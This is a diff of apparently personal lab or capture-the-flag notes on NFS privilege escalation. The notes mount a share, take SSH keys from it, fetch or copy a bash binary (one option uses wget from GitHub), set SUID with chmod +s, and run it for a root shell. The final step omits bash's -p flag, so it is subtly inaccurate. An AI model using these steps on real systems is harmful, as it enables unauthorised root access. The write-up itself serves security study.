@@ -141,8 +141,83 @@ The error message `mount.nfs: mount point /tmp/mount/ does not exist` indicates 
     
 			└─$ sudo mount -t nfs 10.10.150.50:/home /tmp/mount/ -nolock
 
-> after coppying the shares to /tmp/mount cd'd  and looked for importan
+> after coppying the shares to /tmp/mount cd'd  and looked for important files ,
 > 
-> found ssh files they have keys so i logged in via ssh
+> found ssh files they have keys so i logged in via ssh after changing the permetions to ==chmod 600==
 
+
+
+### NFS Access for Privilege Escalation
+
+Let's break down the process of leveraging NFS shares to escalate privileges by bypassing `root_squash` and using **SUID** files.
+
+#### **Step 1: Check NFS Root Squashing**
+
+`root_squash` is a configuration in NFS that prevents remote users from gaining root access to the NFS share. If disabled, a remote user can escalate privileges.
+
+To check whether root squashing is disabled, you'll need to query the NFS server for configuration settings. Typically, this information is found in `/etc/exports`. If root squashing is disabled, remote users could have root access to the NFS share.
+
+#### **Step 2: Upload a Bash Executable to NFS**
+
+Once you have access to the NFS share, the next step is uploading an executable that will allow you to escalate privileges.
+
+1. **Obtain the Bash executable**: Use SCP to download the `bash` binary from the target machine (using the SSH key you obtained):
+    
+    ```bash
+    scp -i key_name username@10.10.150.50:/bin/bash ~/Downloads/bash
+    ```
+    
+2. **Alternatively, download a compatible `bash` from the internet**: You can also download the executable from a GitHub repository. Use `wget` to do this (ensure it's the raw file):
+    
+    ```bash
+    wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
+    ```
+    
+
+#### **Step 3: Set SUID Permissions**
+
+With root squashing potentially disabled, you can upload the bash executable and then set the SUID bit. The SUID bit makes the file execute with the permissions of the file's owner (usually root), not the user executing it.
+
+To upload the file and set SUID permissions:
+
+1. **Upload the Bash file to the NFS share**: This can be done using a command like `cp` or `mv` to transfer the file to the NFS share.
+    
+2. **Set SUID permissions**: Use `chmod` to set the SUID bit:
+    
+    ```bash
+    sudo chmod +s /path/to/bash
+    ```
+    
+
+#### **Step 4: Login Through SSH**
+
+Now that the executable has the SUID bit set, you can log into the target system via SSH.
+
+1. **SSH into the target system** using your obtained credentials:
+    
+    ```bash
+    ssh -i key_name username@10.10.150.50
+    ```
+    
+2. **Execute the Bash executable**: Run the uploaded bash executable with SUID:
+    
+    ```bash
+    /path/to/bash
+    ```
+    
+
+#### **Step 5: Gain Root Access**
+
+By executing the SUID-enabled bash executable, you will gain a shell running with root privileges, thus escalating your privileges to root.
+
+### Summary of Steps:
+
+1. NFS Access
+2. Gain low-privilege shell
+3. Upload bash executable to NFS share
+4. Set SUID permissions through misconfigured root squashing
+5. SSH into target
+6. Execute the bash shell with SUID to escalate to root access
+
+By completing this sequence, you'll have successfully escalated privileges to root on the target machine using NFS shares and SUID binaries.
 
